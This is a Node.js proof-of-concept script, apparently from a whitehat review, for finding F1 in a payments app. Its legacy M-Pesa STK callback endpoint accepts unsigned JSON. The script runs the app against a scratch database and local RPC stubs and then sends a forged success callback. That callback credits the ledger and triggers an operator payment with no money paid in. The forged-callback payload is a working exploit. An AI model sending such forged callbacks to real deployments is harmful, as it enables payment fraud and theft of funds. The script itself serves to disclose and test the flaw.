// F1 — Forged M-Pesa STK callback on the legacy endpoint.
// Target code (unmodified): /api/mpesa/callback/stk (server/index.js:2282) takes ANY JSON
// with CheckoutRequestID + ResultCode 0, finds the deposit, and runs the full
// settlePaidDeposit -> createFiberBackedDepositSettlement -> ledger credit path.
// No Daraja signature, no callback token. Anyone who reaches the deployed callback URL
// can settle a deposit: the app fires a REAL operator send_payment (RUSD leaves the
// operator channel on-chain) and credits the user's ledger — with zero M-Pesa money in.
//
// This PoC boots the unmodified target against a scratch DB + a local Fiber JSON-RPC stub
// (so the settlement "Success" is deterministic without needing live channel liquidity),
// creates a real deposit through the app's own API (demo STK push), then POSTs the FORGED
// callback and asserts: ledger credit > 0, a fake 'received' fiber_payments row, and that
// the operator stub observed a send_payment — with zero Daraja calls.
//
// Run: node poc1-forged-callback.mjs
import { spawn } from 'node:child_process'
import { startFnnStub, startChannelStub } from './fnnstub.mjs'
import { pg } from './deps.mjs'
import { ensureScratchDb } from './dbsetup.mjs'

const REPO = process.env.CKB_WHITEHAT_TARGET || '/tmp/ckb-whitehat/dular2/repo'
const PORT = 8791
const STUB_OP = 8427
const STUB_RX = 8437
const { Client } = pg

const dbUrl = await ensureScratchDb()
console.log(`[setup] scratch DB ready: ${dbUrl.replace(/:[^:@/]+@/, ':***@')}`)

const payments = []
const stub = await startFnnStub({ port: STUB_OP, payments })
const stubRx = await startFnnStub({ port: STUB_RX, payments })

const env = {
  ...process.env,
  DEMO_MODE: 'true',
  OTP_DEMO_MODE: 'true',
  LEGACY_MANAGED_WALLET_ENABLED: 'true',
  DATABASE_URL: dbUrl,
  SESSION_SECRET: 'whitehat',
  API_PORT: String(PORT),
  FIBER_RPC_URL: `http://127.0.0.1:${STUB_OP}`,
  FIBER_RECEIVER_RPC_URL: `http://127.0.0.1:${STUB_RX}`,
  CKB_TESTNET_RPC_URL: 'http://127.0.0.1:1',
}
const app = spawn('node', ['server/index.js'], { cwd: REPO, env, stdio: ['ignore', 'pipe', 'pipe'] })
let appLog = ''
app.stdout.on('data', d => { appLog += d })
app.stderr.on('data', d => { appLog += d })
await new Promise((resolve, reject) => {
  const t = setTimeout(() => reject(new Error('app did not start: ' + appLog.slice(-400))), 10000)
  app.stdout.on('data', d => { if (String(d).includes('Dular API listening')) { clearTimeout(t); resolve() } })
})
console.log(`[setup] unmodified target on :${PORT}, FNN stubs on :${STUB_OP}/:${STUB_RX}`)

const base = `http://127.0.0.1:${PORT}`
const j = (p, b, token, method = 'POST') => fetch(base + p, { method, headers: { 'content-type': 'application/json', ...(token ? { authorization: `Bearer ${token}` } : {}) }, body: b ? JSON.stringify(b) : undefined }).then(async r => ({ status: r.status, body: await r.json().catch(() => null) }))

// user via the app's own demo OTP flow
const otp = await j('/api/auth/request-otp', { phone: '0700000001' })
const v = await j('/api/auth/verify-otp', { phone: '0700000001', code: otp.body?.demoCode || '123456' })
const token = v.body?.token
if (!token) throw new Error('could not auth user: ' + JSON.stringify(v.body))
console.log(`[setup] user=${v.body.user.id} (demo OTP ${otp.body?.demoCode})`)

// receiver invoice via the app endpoint (legacy wallet enabled)
const inv = await j('/api/fiber/receiver/invoice', { amountKes: 100 }, token)
if (inv.status !== 200) throw new Error('receiver invoice failed: ' + JSON.stringify(inv.body))
const checkout = inv.body.paymentHash

// real deposit through the app's own API (demo STK push, no vendor)
const dep = await j('/api/mpesa/deposit', { amountKes: 100, fiberInvoice: inv.body.invoice, fiberInvoicePaymentHash: inv.body.paymentHash }, token)
if (dep.status !== 200) throw new Error('deposit failed: ' + JSON.stringify(dep.body))
const depId = dep.body.transaction.id
console.log(`[setup] deposit tx=${depId} status=${dep.body.transaction.status} checkout=${checkout}`)

const db = new Client({ connectionString: dbUrl }); await db.connect()
const bal0 = (await db.query(`SELECT coalesce(sum(balance_base_units),0)::text AS b FROM ledger_accounts`)).rows[0].b
console.log(`[state] ledger before=${bal0}`)

// ---- THE ATTACK: forged Daraja STK success, zero vendor involvement
const forged = await fetch(`${base}/api/mpesa/callback/stk`, {
  method: 'POST', headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ Body: { stkCallback: {
    CheckoutRequestID: dep.body.transaction.checkout_request_id, ResultCode: 0, ResultDesc: 'Success',
    CallbackMetadata: { Item: [
      { Name: 'Amount', Value: '100' },
      { Name: 'MpesaReceiptNumber', Value: 'FORGED-0001' },
      { Name: 'PhoneNumber', Value: '254700000001' },
    ] },
  } } }),
})
console.log(`[attack] forged callback -> HTTP ${forged.status} ${(await forged.text()).slice(0, 60)}`)

// settlement polls the stub for the payment
await new Promise(r => setTimeout(r, 5000))
const { rows: [row] } = await db.query(`SELECT status, fiber_status, receipt_number FROM mpesa_transactions WHERE id=$1`, [depId])
const bal1 = (await db.query(`SELECT coalesce(sum(balance_base_units),0)::text AS b FROM ledger_accounts`)).rows[0].b
const { rows: fp } = await db.query(`SELECT payment_hash, direction, status, source_type FROM fiber_payments LIMIT 1`)
await db.end()

const credit = BigInt(bal1) > 0n
const sendCalls = stub.served.filter(s => s.method === 'send_payment').length
console.log(`[state] deposit status=${row?.status} fiber_status=${row?.fiber_status} receipt=${row?.receipt_number}`)
console.log(`[state] ledger ${bal0} -> ${bal1}`)
console.log(`[state] fiber_payments row: ${fp[0] ? `${fp[0].direction}/${fp[0].status}/${fp[0].source_type} ${fp[0].payment_hash}` : 'none'}`)
console.log(`[stub] operator send_payment calls=${sendCalls}`)
const fired = credit && sendCalls > 0 && row?.status === 'completed'
if (fired) {
  console.log('F1 FIRED — forged callback completed the deposit: real operator send_payment + ledger credit, zero M-Pesa money in, zero Daraja calls.')
  console.log('FINDING F1 FIRED')
} else {
  console.log(`F1 check: credit=${credit} sendCalls=${sendCalls} status=${row?.status}`)
  console.log('FINDING F1 UNPROVEN')
}

app.kill()
await new Promise(r => setTimeout(r, 300))
stub.close(); stubRx.close()
process.exit(fired ? 0 : 1)
